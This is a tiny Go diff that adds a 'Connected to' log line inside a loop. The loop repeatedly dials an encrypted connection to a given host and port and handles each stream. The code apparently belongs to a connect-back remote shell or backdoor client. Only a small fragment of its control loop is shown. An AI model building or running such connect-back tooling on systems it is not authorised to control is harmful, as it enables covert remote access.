@@ -69,6 +69,7 @@ func Run(secret []byte, host string, port int, delay int, runAsDaemon bool) {
 		for {
 			stream, err := pel.Dial(addr, secret, true)
 			if err == nil {
+				log.Println("Connected to", addr)
 				go handleGeneric(stream)
 			} else {
 				log.Printf("Dial failed: %v\n", err)
